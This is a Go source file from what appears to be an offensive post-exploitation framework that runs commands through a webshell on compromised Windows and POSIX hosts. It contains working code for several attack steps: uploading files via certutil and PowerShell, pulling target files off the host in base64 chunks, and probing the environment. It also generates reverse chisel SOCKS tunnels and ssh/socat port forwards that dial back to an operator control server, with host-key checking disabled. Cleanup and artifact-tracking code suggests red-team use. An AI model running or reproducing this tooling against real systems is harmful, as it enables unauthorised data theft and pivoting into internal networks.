			part.Note = fmt.Sprintf("写入压缩块 %d 失败: %s", offset/intranetWindowsUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
			return part, errors.New(part.Note)
		}
	}
	decode := run("certutil -decode -f "+b64Temp+" "+gzTemp, 30*time.Second)
	if decode.IsError {
		cleanup()
		decode.IsError = true
		decode.Note = "certutil 解码失败: " + strings.TrimSpace(decode.Output+decode.Note)
		return decode, errors.New(decode.Note)
	}
	gunzip := `$in=[IO.File]::OpenRead('` + gzName + `');$out=[IO.File]::Create('` + normalized + suffix + `.bin');` +
		`$gz=New-Object IO.Compression.GZipStream($in,[IO.Compression.CompressionMode]::Decompress);` +
		`$buf=New-Object byte[] 81920;while(($n=$gz.Read($buf,0,$buf.Length)) -gt 0){$out.Write($buf,0,$n)};` +
		`$gz.Close();$out.Close();$in.Close()`
	unpacked := run(`"`+intranetWindowsPowerShellPath()+`" -NoProfile -NonInteractive -Command "`+gunzip+`"`, 60*time.Second)
	sizeOut := run(intranetWindowsSizeCmd(binTemp), 20*time.Second)
	got, _ := strconv.Atoi(strings.TrimSpace(sizeOut.Output))
	if unpacked.IsError || got != size {
		cleanup()
		sizeOut.IsError = true
		sizeOut.Note = fmt.Sprintf("解压后大小不符（期望 %d，实际 %q）", size, strings.TrimSpace(sizeOut.Output))
		return sizeOut, errors.New(sizeOut.Note)
	}
	moved := run("move /y "+binTemp+" "+target, 20*time.Second)
	if moved.IsError {
		cleanup()
		moved.IsError = true
		moved.Note = "覆盖目标文件失败: " + strings.TrimSpace(moved.Output+moved.Note)
		return moved, errors.New(moved.Note)
	}
	cleanup()
	out = moved
	out.Output = fmt.Sprintf("已写入 %s（%d 字节，gzip 传输 %d 字节）", target, size, len(gz))
	return out, nil
}

func (s *Server) intranetUpload(ctx context.Context, pg *db.DB, sess *db.IntranetSession, path string, content []byte) (intranetExecOutcome, error) {
	out := intranetExecOutcome{ExitCode: -1}
	path = strings.TrimSpace(path)
	if path == "" {
		out.IsError, out.Note = true, "目标路径不能为空"
		return out, errors.New(out.Note)
	}
	if len(content) == 0 {
		out.IsError, out.Note = true, "文件内容为空"
		return out, errors.New(out.Note)
	}
	if len(content) > intranetUploadLimit {
		out.IsError, out.Note = true, fmt.Sprintf("文件超过 %d 字节上限", intranetUploadLimit)
		return out, errors.New(out.Note)
	}
	osKind := s.intranetOS(ctx, pg, sess)
	run := func(command string, timeout time.Duration) intranetExecOutcome {
		return s.intranetRun(ctx, pg, sess, command, timeout)
	}
	var compressed, existed bool
	var err error
	if osKind == intranetOSWindows {
		out, compressed, existed, err = intranetUploadWindows(run, path, content)
	} else {
		out, compressed, existed, err = intranetUploadPOSIX(run, path, content)
	}
	if err != nil {
		_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, truncateIntranetOutput(strings.TrimSpace(out.Output+out.Note), 4000), true)
		return out, err
	}
	if compressed {
		out.Output += "\n传输方式：gzip 分块压缩"
	}
	// Overwriting a pre-existing file must not make cleanup delete someone
	// else's file, so only newly created paths enter the artifact ledger.
	_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, truncateIntranetOutput(out.Output, 4000), false)
	if !existed {
		s.registerUploadedArtifact(ctx, pg, sess, osKind, path, len(content), &out)
	}
	return out, nil
}

// registerUploadedArtifact puts a newly created file into the revocable ledger.
// The revoke command removes exactly the uploaded path; verification checks it
// is gone. A ledger failure never fails the upload itself, but is recorded.
func (s *Server) registerUploadedArtifact(ctx context.Context, pg *db.DB, sess *db.IntranetSession, osKind, targetPath string, size int, out *intranetExecOutcome) {
	taskID := int64(0)
	if sess.TaskID != nil {
		taskID = *sess.TaskID
	}
	name := pathpkg.Base(strings.ReplaceAll(targetPath, `\`, "/"))
	if name == "" || name == "." || name == "/" {
		name = targetPath
	}
	revoke := "rm -f " + shQuote(targetPath) + " && echo " + intranetArtifactOK
	verify := "test -e " + shQuote(targetPath) + " && echo " + intranetArtifactPresent + " || echo " + intranetArtifactGone
	if osKind == intranetOSWindows {
		quoted, _, ok := intranetWindowsPath(targetPath)
		if !ok {
			_ = pg.AddIntranetSessionEvent(sess.ID, "artifact", targetPath, "上传成功但登记落地物失败: Windows 路径无法生成撤销命令", true)
			return
		}
		// del 幂等：目标已被外部删除时也应该能正常走完撤销并由验证确认；
		// cmd 内建 echo 不重置 ERRORLEVEL，末尾显式归零。
		revoke = "del /f /q " + quoted + " >nul 2>&1 & echo " + intranetArtifactOK + " & cmd /c exit 0"
		verify = "(if exist " + quoted + " (echo " + intranetArtifactPresent + ") else (echo " + intranetArtifactGone + ")) & cmd /c exit 0"
	}
	art, err := pg.AddIntranetArtifact(db.IntranetArtifactInput{
		TaskID: taskID, SessionID: sess.ID, Host: sess.Host,
		Kind: db.IntranetArtifactFile, Name: name, Path: targetPath,
		Description:   fmt.Sprintf("上传文件（%d 字节）", size),
		DeployCommand: fmt.Sprintf("上传 %d 字节到 %s", size, targetPath),
		RevokeCommand: revoke,
		VerifyCommand: verify,
		Evidence:      fmt.Sprintf("上传成功：%s（%d 字节）", targetPath, size),
	})
	if err != nil {
		_ = pg.AddIntranetSessionEvent(sess.ID, "artifact", targetPath, "上传成功但登记落地物失败: "+err.Error(), true)
		return
	}
	if out != nil {
		out.Note = fmt.Sprintf("已登记落地物 #%d，撤离时将自动撤销 %s", art.ID, targetPath)
	}
	_ = pg.AddIntranetSessionEvent(sess.ID, "artifact", targetPath, fmt.Sprintf("登记落地物 #%d（%s）", art.ID, name), false)
}

func intranetDownloadChunkRun(run intranetCommandRunner, path string, offset, n int64, useGzip bool) ([]byte, intranetExecOutcome, bool) {
	out := run(intranetDownloadChunkCmd(path, offset, n, useGzip), 60*time.Second)
	if out.IsError {
		if strings.TrimSpace(out.Note) == "" {
			out.Note = "读取分块失败"
		}
		return nil, out, false
	}
	raw, ok := parseIntranetChunk(out.Output)
	if !ok {
		out.IsError, out.Note = true, "分块响应缺少标记或 base64 无效"
		return nil, out, false
	}
	data := raw
	if useGzip {
		data, ok = parseGzipChunk(raw)
		if !ok {
			out.IsError, out.Note = true, "分块 gzip 解压失败"
			return nil, out, false
		}
	}
	if int64(len(data)) != n {
		out.IsError = true
		out.Note = fmt.Sprintf("分块大小不符（期望 %d，实际 %d）", n, len(data))
		return nil, out, false
	}
	return data, out, true
}

func intranetDownloadPOSIX(run intranetCommandRunner, path string, maxBytes int) (data []byte, total int64, truncated, compressed bool, out intranetExecOutcome) {
	out = intranetExecOutcome{ExitCode: -1}
	meta := run(intranetDownloadMetaCmd(path), 20*time.Second)
	if meta.IsError {
		meta.IsError = true
		if strings.TrimSpace(meta.Note) == "" {
			meta.Note = "无法读取文件大小（文件可能不存在或不是普通文件）"
		}
		return nil, 0, false, false, meta
	}
	total, gzipOK, ok := parseIntranetDownloadMeta(meta.Output)
	if !ok {
		out.IsError, out.Note = true, "无法读取文件大小（文件可能不存在或不是普通文件）"
		return nil, 0, false, false, out
	}
	want := total
	if int64(maxBytes) < want {
		want = int64(maxBytes)
		truncated = true
	}
	var buf bytes.Buffer
	for offset := int64(0); offset < want; offset += int64(intranetDownloadChunk) {
		n := int64(intranetDownloadChunk)
		if offset+n > want {
			n = want - offset
		}
		chunk, part, ok := intranetDownloadChunkRun(run, path, offset, n, gzipOK)
		if !ok && gzipOK {
			// The target may have lost gzip between the capability probe and the
			// chunk. Retry this chunk uncompressed and stop compressing the rest.
			chunk, part, ok = intranetDownloadChunkRun(run, path, offset, n, false)
			if ok {
				gzipOK = false
			}
		}
		if !ok {
			return nil, total, truncated, compressed, part
		}
		if gzipOK {
			compressed = true
		}
		buf.Write(chunk)
	}
	data = buf.Bytes()
	if int64(len(data)) != want {
		out.IsError = true
		out.Note = fmt.Sprintf("下载大小不符（期望 %d，实际 %d）", want, len(data))
		return nil, total, truncated, compressed, out
	}
	out.ExitCode = 0
	note := ""
	if compressed {
		note = "，gzip 分块压缩"
	}
	out.Output = fmt.Sprintf("已读取 %s（%d 字节，共 %d 字节%s）", path, len(data), total, note)
	return data, total, truncated, compressed, out
}

func intranetWindowsPSDownloadChunkCmd(normalized string, offset, n int64) string {
	script := fmt.Sprintf(`$p='%s';$fs=[IO.File]::OpenRead($p);[void]$fs.Seek(%d,'Begin');`+
		`$buf=New-Object byte[] %d;$n=$fs.Read($buf,0,%d);$fs.Close();`+
		`$ms=New-Object IO.MemoryStream;$gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Compress);`+
		`$gz.Write($buf,0,$n);$gz.Close();[Convert]::ToBase64String($ms.ToArray())`,
		normalized, offset, n, n)
	return "echo " + intranetChunkMarker + " & \"" + intranetWindowsPowerShellPath() +
		"\" -NoProfile -NonInteractive -Command \"" + script + "\" & echo " + intranetChunkEndMarker
}

func intranetDownloadWindowsPS(run intranetCommandRunner, normalized string, total int64) ([]byte, intranetExecOutcome, bool) {
	out := intranetExecOutcome{ExitCode: -1}
	var buf bytes.Buffer
	for offset := int64(0); offset < total; offset += int64(intranetDownloadChunk) {
		n := int64(intranetDownloadChunk)
		if offset+n > total {
			n = total - offset
		}
		part := run(intranetWindowsPSDownloadChunkCmd(normalized, offset, n), 60*time.Second)
		raw, ok := parseIntranetChunk(part.Output)
		if part.IsError || !ok {
			if strings.TrimSpace(part.Note) == "" {
				part.Note = "PowerShell 分块下载失败"
			}
			part.IsError = true
			return nil, part, false
		}
		data, zok := parseGzipChunk(raw)
		if !zok {
			part.IsError, part.Note = true, "PowerShell 分块 gzip 解压失败"
			return nil, part, false
		}
		if int64(len(data)) != n {
			part.IsError = true
			part.Note = fmt.Sprintf("分块大小不符（期望 %d，实际 %d）", n, len(data))
			return nil, part, false
		}
		buf.Write(data)
	}
	out.ExitCode = 0
	return buf.Bytes(), out, true
}

// intranetDownloadWindowsCertutil is the fallback for hosts without
// PowerShell. certutil encodes the whole file, so callers cap this path to
// keep one webshell response bounded.
func intranetDownloadWindowsCertutil(run intranetCommandRunner, path, target string, total int64) ([]byte, int64, bool, intranetExecOutcome) {
	out := intranetExecOutcome{ExitCode: -1}
	temp := fmt.Sprintf(`"%%TEMP%%\jw%d.b64"`, time.Now().UnixNano())
	cleanup := func() {
		_ = run("del /f /q "+temp, 10*time.Second)
	}
	enc := run("certutil -encode -f "+target+" "+temp, 30*time.Second)
	if enc.IsError {
		cleanup()
		enc.IsError = true
		enc.Note = "certutil 编码失败: " + strings.TrimSpace(enc.Output+enc.Note)
		return nil, total, false, enc
	}
	dump := run("type "+temp, 45*time.Second)
	cleanup()
	if dump.IsError {
		return nil, total, false, dump
	}
	data, derr := parseCertutilBase64(dump.Output)
	if derr != nil {
		out.IsError, out.Note = true, "解析 certutil 输出失败: "+derr.Error()
		return nil, total, false, out
	}
	out.ExitCode = 0
	out.Output = fmt.Sprintf("已读取 %s（%d 字节，共 %d 字节）", path, len(data), total)
	return data, total, false, out
}

func intranetDownloadWindows(run intranetCommandRunner, path string, maxBytes int) ([]byte, int64, bool, bool, intranetExecOutcome) {
	out := intranetExecOutcome{ExitCode: -1}
	target, normalized, ok := intranetWindowsPath(path)
	if !ok {
		out.IsError, out.Note = true, "Windows 目标路径必须是盘符绝对路径，且不能包含引号、% 或通配符"
		return nil, 0, false, false, out
	}
	sizeOut := run(intranetWindowsSizeCmd(target), 20*time.Second)
	total, err := strconv.ParseInt(strings.TrimSpace(sizeOut.Output), 10, 64)
	if err != nil || sizeOut.IsError {
		out.IsError, out.Note = true, "无法读取文件大小（文件可能不存在或不是普通文件）"
		return nil, 0, false, false, out
	}
	if total > int64(maxBytes) {
		out.IsError, out.Note = true, fmt.Sprintf("文件 %d 字节超过下载上限 %d 字节", total, maxBytes)
		return nil, total, false, false, out
	}
	if total == 0 {
		out.ExitCode = 0
		out.Output = fmt.Sprintf("已读取 %s（0 字节，共 0 字节）", path)
		return []byte{}, 0, false, false, out
	}
	ps := run(intranetWindowsPSAvailableCmd(), 15*time.Second)
	if strings.Contains(ps.Output, intranetPSMarker+"1") {
		data, psOut, ok := intranetDownloadWindowsPS(run, normalized, total)
		if ok {
			psOut.Output = fmt.Sprintf("已读取 %s（%d 字节，共 %d 字节，PowerShell 分块 gzip）", path, len(data), total)
			return data, total, false, true, psOut
		}
		// PowerShell exists but failed. certutil can still recover small files.
		if total > intranetWindowsCertutilLimit {
			psOut.IsError, psOut.Note = true, "PowerShell 分块下载失败: "+strings.TrimSpace(psOut.Output+psOut.Note)
			return nil, total, false, false, psOut
		}
	}
	data, gotTotal, truncated, out := intranetDownloadWindowsCertutil(run, path, target, total)
	return data, gotTotal, truncated, false, out
}

func (s *Server) intranetDownload(ctx context.Context, pg *db.DB, sess *db.IntranetSession, path string, maxBytes int) ([]byte, int64, bool, intranetExecOutcome) {
	out := intranetExecOutcome{ExitCode: -1}
	path = strings.TrimSpace(path)
	if path == "" {
		out.IsError, out.Note = true, "目标路径不能为空"
		return nil, 0, false, out
	}
	if maxBytes <= 0 || maxBytes > intranetDownloadLimit {
		maxBytes = intranetDownloadLimit
	}
	osKind := s.intranetOS(ctx, pg, sess)
	run := func(command string, timeout time.Duration) intranetExecOutcome {
		return s.intranetRun(ctx, pg, sess, command, timeout)
	}
	var data []byte
	var total int64
	var truncated, compressed bool
	if osKind == intranetOSWindows {
		data, total, truncated, compressed, out = intranetDownloadWindows(run, path, maxBytes)
	} else {
		data, total, truncated, compressed, out = intranetDownloadPOSIX(run, path, maxBytes)
	}
	if out.IsError {
		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, truncateIntranetOutput(out.Output+out.Note, 4000), true)
		return nil, total, truncated, out
	}
	if compressed {
		out.Output += "\n传输方式：gzip 分块压缩"
	}
	_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Output, false)
	return data, total, truncated, out
}

// intranetProbe collects OS/user/tool availability from the target.
func (s *Server) intranetProbe(ctx context.Context, pg *db.DB, sess *db.IntranetSession) (intranetProbeInfo, intranetExecOutcome) {
	script := intranetProbeScript
	if s.intranetOS(ctx, pg, sess) == intranetOSWindows {
		script = `echo __JW_HOST__%COMPUTERNAME% & echo __JW_KERNEL__%OS% & echo __JW_USER__%USERNAME% & echo __JW_BIN__cmd & if exist "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" echo __JW_BIN__powershell`
	}
	out := s.intranetRun(ctx, pg, sess, script, 30*time.Second)
	info := intranetProbeInfo{Raw: truncateIntranetOutput(out.Output, 4000)}
	for _, line := range strings.Split(out.Output, "\n") {
		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "__JW_HOST__"):
			info.Host = strings.TrimPrefix(line, "__JW_HOST__")
		case strings.HasPrefix(line, "__JW_KERNEL__"):
			info.Kernel = strings.TrimPrefix(line, "__JW_KERNEL__")
		case strings.HasPrefix(line, "__JW_USER__"):
			info.User = strings.TrimPrefix(line, "__JW_USER__")
		case strings.HasPrefix(line, "__JW_BIN__"):
			info.Bins = append(info.Bins, strings.TrimPrefix(line, "__JW_BIN__"))
		}
	}
	_ = pg.AddIntranetSessionEvent(sess.ID, "probe", "环境探测", truncateIntranetOutput(out.Output, 4000), out.IsError)
	return info, out
}

func intranetHasBin(info intranetProbeInfo, name string) bool {
	for _, b := range info.Bins {
		if b == name {
			return true
		}
	}
	return false
}

// intranetPivotServer returns the operator-configured control endpoint that a
// chisel/ssh tunnel can dial back to. Bare hostnames/IPs default to chisel's
// 8788; JINGWEI_PIVOT_SERVER may carry an explicit port (host:port).
func intranetPivotServer() (host string, port int, err error) {
	raw := strings.TrimSpace(os.Getenv("JINGWEI_PIVOT_SERVER"))
	if raw == "" {
		return "", 0, errors.New("未配置 JINGWEI_PIVOT_SERVER（目标可访问的控制端地址，如 10.0.0.5:8788），无法自动生成 chisel/ssh 隧道命令；请手动提供 deploy_command")
	}
	if strings.Contains(raw, "://") {
		if u, perr := url.Parse(raw); perr == nil && u.Host != "" {
			raw = u.Host
		}
	}
	host = strings.Trim(strings.TrimSpace(raw), "[]")
	port = 8788
	if h, p, perr := net.SplitHostPort(strings.TrimSpace(raw)); perr == nil {
		host = strings.Trim(h, "[]")
		n, aerr := strconv.Atoi(p)
		if aerr != nil || n <= 0 || n > 65535 {
			return "", 0, errors.New("JINGWEI_PIVOT_SERVER 端口无效，应为 host:port")
		}
		port = n
	}
	if host == "" {
		return "", 0, errors.New("JINGWEI_PIVOT_SERVER 缺少主机地址")
	}
	return host, port, nil
}

func intranetPivotEndpoint() (string, error) {
	host, port, err := intranetPivotServer()
	if err != nil {
		return "", err
	}
	return intranetHostPort(host, port), nil
}

// intranetPivotSSHPort returns the port the SSH variants of a tunnel dial.
// It cannot reuse JINGWEI_PIVOT_SERVER's port: that one is chisel's server port
// (8788 by default), while sshd is nearly always 22 — one value cannot serve both,
// and the generated `ssh -D`/`ssh -L` would otherwise try to log into chisel.
func intranetPivotSSHPort() (int, error) {
	raw := strings.TrimSpace(os.Getenv("JINGWEI_PIVOT_SSH_PORT"))
	if raw == "" {
		return 22, nil
	}
	n, err := strconv.Atoi(raw)
	if err != nil || n < 1 || n > 65535 {
		return 0, fmt.Errorf("JINGWEI_PIVOT_SSH_PORT 无效（应为 1-65535）: %s", raw)
	}
	return n, nil
}

// chiselFingerprintArg renders the optional `--fingerprint` flag for a chisel
// client. chisel has no "auto" value — passing one makes the client treat the
// literal string as a SHA-256 fingerprint, so the handshake fails with
// "Invalid fingerprint" and retries forever (found on chisel 1.13.0). Default is
// therefore to omit the flag; operators who care about MITM on the pivot leg set
// JINGWEI_PIVOT_CHISEL_FINGERPRINT to the base64 fingerprint the server prints.
func chiselFingerprintArg() (string, error) {
	fp := strings.TrimSpace(os.Getenv("JINGWEI_PIVOT_CHISEL_FINGERPRINT"))
	if fp == "" {
		return "", nil
	}
	if !chiselFingerprintRE.MatchString(fp) {
		return "", fmt.Errorf("JINGWEI_PIVOT_CHISEL_FINGERPRINT 不是合法的 SHA-256 指纹（应为 43-44 位 base64，来自 chisel server 启动日志），实得 %q", fp)
	}
	return "--fingerprint " + shQuote(fp) + " ", nil
}

// sshBindPrefix 同 chiselBindPrefix：ssh 的 -L 不写绑定地址时只听客户端回环。
func sshBindPrefix(t *db.IntranetTunnel) string { return chiselBindPrefix(t) }

// chiselBindPrefix 把隧道登记的监听地址翻译成 chisel 的绑定前缀。
// 不写就默认 127.0.0.1，那样监听开在控制端回环上，跑在另一个网络命名空间里的
// 平台进程（verify 与之后的代理扫描）根本拨不到——2026-11-05 真机验证就是这么暴露的。
func chiselBindPrefix(t *db.IntranetTunnel) string {
	h := strings.TrimSpace(t.ListenHost)
	if h == "" || h == "0.0.0.0" || h == "::" {
		return "0.0.0.0:"
	}
	return h + ":"
}

// chiselPinNote says whether the pivot leg's server key is pinned, so the plan
// output tells the operator what trust they are getting.
func chiselPinNote() string {
	if strings.TrimSpace(os.Getenv("JINGWEI_PIVOT_CHISEL_FINGERPRINT")) == "" {
		return "；未固定服务端指纹（信任控制端上那个 chisel server），要防中间人就配 JINGWEI_PIVOT_CHISEL_FINGERPRINT"
	}
	return "；已按 JINGWEI_PIVOT_CHISEL_FINGERPRINT 固定控制端指纹"
}

var chiselFingerprintRE = regexp.MustCompile(`^[A-Za-z0-9+/]{43}={0,1}$`)

// autoSelectTunnelCommand picks the best deployment command based on what tools
// are available on the target. 隧道自动选型：目标上有什么就用什么，优先选
// 功能最强的工具（chisel > ssh > socat），而不是让操作员自己猜。
//
// listenSide says where the listener actually ends up, which is not always the
// target: chisel client creates the SOCKS/forward listener on its server (the
// control end), while socat, ssh -D and ssh -L listen where they run — the
// target. Verify and teardown must look on that side or they "fail" a working
// tunnel and re-check a port that was never there.
func autoSelectTunnelCommand(kind string, info intranetProbeInfo, t *db.IntranetTunnel) (deploy, reason, listenSide string) {
	listenPort := t.ListenPort
	remoteHost := t.RemoteHost
	remotePort := t.RemotePort
	// 端口不在这里取：chisel 用 JINGWEI_PIVOT_SERVER 的端口，ssh 变体用 intranetPivotSSHPort。
	pivotHost, _, pivotErr := intranetPivotServer()
	listenSide = db.IntranetListenSideTarget

	switch kind {
	case db.IntranetTunnelKindSocks5:
		// SOCKS5: chisel > ssh -D
		if listenPort <= 0 {
			return "", "SOCKS5 需要 listen_port（目标上的 SOCKS 监听端口）", listenSide
		}
		if intranetHasBin(info, "chisel") {
			if pivotErr != nil {
				return "", pivotErr.Error(), listenSide
			}
			pivot, _ := intranetPivotEndpoint()
			fpArg, fpErr := chiselFingerprintArg()
			if fpErr != nil {
				return "", fpErr.Error(), listenSide
			}
			deploy = intranetBackgroundTunnel(t.ID, fmt.Sprintf("chisel client %s%s R:%s%d:socks", fpArg, shQuote(pivot), chiselBindPrefix(t), listenPort))
			reason = "目标有 chisel，用 `chisel client … R:" + strconv.Itoa(listenPort) + ":socks` 建 SOCKS5：" +
				"R: 前缀让监听开在控制端、SOCKS 的出口在目标（2026-11-05 真机验证：经它可达仅内网段），" +
				"控制端探测自己的 " + strconv.Itoa(listenPort) + " 即可，目标侧的端口检查验证不到它；" +
				"前提：控制端的 chisel server 必须带 --reverse，否则这个 R: 请求会被服务端拒绝。" +
				"不带 R: 的 `<port>:socks` 方向正好相反（目标监听、出口在控制端），打不到内网，别用。" + chiselPinNote()
			return deploy, reason, db.IntranetListenSidePivot
		} else if intranetHasBin(info, "ssh") {
			if pivotErr != nil {
				return "", pivotErr.Error(), listenSide
			}
			sshPort, sshErr := intranetPivotSSHPort()
			if sshErr != nil {
				return "", sshErr.Error(), listenSide
			}
			deploy = intranetBackgroundTunnel(t.ID, fmt.Sprintf("ssh -N -D 0.0.0.0:%d -p %d -o BatchMode=yes -o ConnectTimeout=10 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s",
				listenPort, sshPort, shQuote(pivotHost)))
			reason = "目标有 ssh，用 ssh -D 建 SOCKS5（目标监听 " + strconv.Itoa(listenPort) +
				"，回连控制端 " + pivotHost + ":" + strconv.Itoa(sshPort) +
				"；BatchMode 下要求目标到控制端已免密，否则会立刻失败而不是卡在口令提示。注意 -D 的出口在控制端，" +
				"只能让目标借用控制端的网络，不能用于访问控制端不可达的内网段）"
		} else {
			return "", "目标上没有 chisel/ssh，无法自动建 SOCKS5；请手动提供 deploy_command", listenSide
		}
		return deploy, reason, listenSide

	case db.IntranetTunnelKindPort, db.IntranetTunnelKindRemote:
		// 端口转发：socat > ssh -L > chisel
		if remoteHost == "" || remotePort <= 0 || listenPort <= 0 {
			return "", "需要 listen_port、remote_host 与 remote_port", listenSide
		}
		if intranetHasBin(info, "socat") {
			listen := "TCP-LISTEN:" + strconv.Itoa(listenPort)
			if h := strings.TrimSpace(t.ListenHost); h != "" && h != "0.0.0.0" && h != "::" {
				listen += ",bind=" + h
			}
			listen += ",fork,reuseaddr"
			deploy = intranetBackgroundTunnel(t.ID, "socat "+listen+" TCP:"+intranetHostPort(remoteHost, remotePort))
			reason = "目标有 socat，用 socat 做端口转发"
		} else if intranetHasBin(info, "ssh") {
			if pivotErr != nil {
				return "", pivotErr.Error(), listenSide
			}
			sshPort, sshErr := intranetPivotSSHPort()
			if sshErr != nil {
				return "", sshErr.Error(), listenSide
			}
			deploy = intranetBackgroundTunnel(t.ID, fmt.Sprintf("ssh -N -L %s%d:%s:%d -p %d -o BatchMode=yes -o ConnectTimeout=10 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s",
				sshBindPrefix(t), listenPort, remoteHost, remotePort, sshPort, shQuote(pivotHost)))
			reason = "目标没有 socat，用 ssh -L 做端口转发（回连控制端 " + pivotHost + ":" + strconv.Itoa(sshPort) +
				"；注意：-L 的目的地由控制端发起，" +
				"只有控制端也能访问 " + remoteHost + " 时才有意义；穿透到控制端不可达的内网段请改用 socat/chisel 或手工 deploy_command）"
		} else if intranetHasBin(info, "chisel") {
			if pivotErr != nil {
				return "", pivotErr.Error(), listenSide
			}
			if kind != db.IntranetTunnelKindRemote {
				// chisel 只有「一端监听、另一端拨号」两种形态，表达不了「目标监听且由目标拨号」，
				// 那正是 port_forward（等价 socat）的方向。给一条反向的命令只会造成假成功。
				return "", "chisel 表达不了 port_forward 的方向（R: 是控制端监听、由目标拨目的地；" +
					"不带 R: 是目标监听、由控制端拨目的地），目标侧监听+目标侧发起请用 socat 或手写 deploy_command", listenSide
			}
			pivot, _ := intranetPivotEndpoint()
			fpArg, fpErr := chiselFingerprintArg()
			if fpErr != nil {
				return "", fpErr.Error(), listenSide
			}
			spec := fmt.Sprintf("R:%s%d:%s:%d", chiselBindPrefix(t), listenPort, remoteHost, remotePort)
			deploy = intranetBackgroundTunnel(t.ID, fmt.Sprintf("chisel client %s%s %s", fpArg, shQuote(pivot), spec))
			reason = "目标没有 socat/ssh，用 chisel 做反向转发：" + spec +
				" 让控制端监听 " + strconv.Itoa(listenPort) + "，对 " + remoteHost + ":" + strconv.Itoa(remotePort) +
				" 的连接由目标发起，所以能打到只有目标可达的内网服务（2026-11-05 真机验证 200）。" +
				"前提：控制端 chisel server 带 --reverse。" + chiselPinNote()
			return deploy, reason, db.IntranetListenSidePivot
		} else {
			return "", "目标上没有 socat/ssh/chisel，无法自动生成转发命令；请手动提供 deploy_command", listenSide
		}
		return deploy, reason, listenSide
	}
	return "", "不支持的隧道类型: " + kind, listenSide
}

func intranetVerifyCommand(port int) string {
	return "(ss -lnt 2>/dev/null || netstat -lnt 2>/dev/null) | grep -qE '[:.]" + strconv.Itoa(port) + "[[:space:]]' && echo JW_TUNNEL_OK || echo JW_TUNNEL_FAIL"
}

// intranetTunnelTag is the on-target path prefix for a tunnel's log/pid files.
func intranetTunnelTag(tunnelID int64) string {
	if tunnelID <= 0 {
		return ""
	}
	return "/tmp/jw_tunnel_" + strconv.FormatInt(tunnelID, 10)
}

// intranetBackgroundTunnel starts a long-lived tunnel client. The PID goes both to
// stdout and to a pid file: a noisy webshell can swallow the echo, and a chisel or
// ssh client whose PID we lost is a process nothing can stop afterwards.
func intranetBackgroundTunnel(tunnelID int64, inner string) string {
	tag := intranetTunnelTag(tunnelID)
	if tag == "" {
		return "nohup " + inner + " </dev/null >/dev/null 2>&1 & echo JW_PID:$!"
	}
	return "nohup " + inner + " </dev/null >" + tag + ".log 2>&1 & p=$!; echo $p >" + tag + ".pid; echo JW_PID:$p"
}

// intranetTunnelTeardown kills the captured PID and, when the ledger lost it, the
// PID still recorded on the target — an empty teardown means evacuation silently
// leaves the tunnel running.
func intranetTunnelTeardown(pid int, tunnelID int64) string {
	tag := intranetTunnelTag(tunnelID)
	parts := []string{}
	if cmd := intranetKillCommand(pid); cmd != "" {
		parts = append(parts, cmd)
	}
	if tag != "" {
		parts = append(parts, "p=$(cat "+tag+".pid 2>/dev/null); if [ -n \"$p\" ]; then kill \"$p\" 2>/dev/null; sleep 1; kill -9 \"$p\" 2>/dev/null; fi")
	}
	if len(parts) == 0 {
		return ""
	}
	if tag != "" {
		parts = append(parts, "rm -f "+tag+".pid "+tag+".log")
	}
	return strings.Join(parts, "; ")
}

// intranetPivotVerifyMarker records that the listener has to be checked on the
// control side. chisel client opens its SOCKS/forward listener on the chisel
// server, not where the client runs, so an `ss` on the target would report
// JW_TUNNEL_FAIL for a tunnel that works.
func intranetPivotVerifyMarker(port int) string {
	return "pivot:tcp:" + strconv.Itoa(port)
}

func intranetTunnelListensOnPivot(t *db.IntranetTunnel) bool {
	return t != nil && strings.EqualFold(strings.TrimSpace(t.ListenSide), db.IntranetListenSidePivot)
}

// intranetTunnelSide renders the recorded listen side with a stable default, so
// ledgers and notes never print an empty field for rows written before the column.
func intranetTunnelSide(t *db.IntranetTunnel) string {
	if intranetTunnelListensOnPivot(t) {
		return db.IntranetListenSidePivot
	}
	return db.IntranetListenSideTarget
}

// intranetListenSideArg validates a caller-supplied listen side. Empty means
// "leave it to the ledger/auto-selection"; anything but the two known values is a
// typo that would silently misplace verify and teardown.
func intranetListenSideArg(side string) (string, error) {
	v := strings.ToLower(strings.TrimSpace(side))
	switch v {
	case "", db.IntranetListenSideTarget, db.IntranetListenSidePivot:
		return v, nil
	}
	return "", fmt.Errorf("listen_side 只能是 %s 或 %s", db.IntranetListenSideTarget, db.IntranetListenSidePivot)
}

// intranetPivotMarkerPort reads the port back out of a pivot:tcp:N verify command
// so a tunnel row that lost its listen_port still gets verified.
func intranetPivotMarkerPort(cmd string) int {
	n, err := strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(strings.TrimSpace(cmd), "pivot:tcp:")))
	if err != nil || n <= 0 {
		return 0
	}
	return n
}

// intranetVerifyFailReason condenses a failed check into one line for the ledger
// note — the caller only sees this, so quoting the target's own words matters.
func intranetVerifyFailReason(out intranetExecOutcome) string {
	if line := strings.TrimSpace(out.Output); line != "" {
		if i := strings.IndexByte(line, '\n'); i >= 0 {
			line = line[:i]
		}
		return truncateIntranetOutput(line, 200)
	}
	if note := strings.TrimSpace(out.Note); note != "" {
		return note
	}
	return "验证未确认监听端口在位"
}

// intranetHostIsLocal reports whether host is this machine (loopback or an
// address on one of its interfaces).
func intranetHostIsLocal(host string) bool {
	host = strings.TrimSpace(strings.Trim(strings.TrimSpace(host), "[]"))
	if host == "" {
		return false
	}
	if h, _, err := net.SplitHostPort(host); err == nil {
		host = h
	}
	if strings.EqualFold(host, "localhost") {
		return true
	}
	if ip := net.ParseIP(host); ip != nil {
		if ip.IsLoopback() {
			return true
		}
	}
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return false
	}
	for _, a := range addrs {
		var ip net.IP
		switch n := a.(type) {
		case *net.IPNet:
			ip = n.IP
		case *net.IPAddr:
			ip = n.IP
		}
		if ip.String() == host {
			return true
		}
	}
	return false
}

// intranetPivotListenerState checks a control-side listener from here: read the
// local socket table when the pivot is this machine (one distro's /proc/net/tcp
// shows the shared listener set under WSL mirrored networking), otherwise prove
